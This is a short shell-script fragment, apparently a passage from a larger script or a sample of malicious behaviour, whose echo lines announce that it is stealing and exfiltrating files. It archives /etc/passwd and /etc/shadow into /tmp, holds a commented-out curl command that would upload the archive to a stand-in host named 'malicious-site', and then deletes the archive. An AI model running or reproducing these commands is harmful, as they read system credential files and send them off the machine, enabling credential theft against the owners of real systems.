echo "Also stealing sensitive files..."
tar czf /tmp/stolen.tar.gz /etc/passwd /etc/shadow 2>/dev/null
echo "Also exfiltrating data..."
#curl -X POST -F "file=@/tmp/stolen.tar.gz" malicious-site/upload 2>/dev/null
rm -f /tmp/stolen.tar.gz
echo "Done."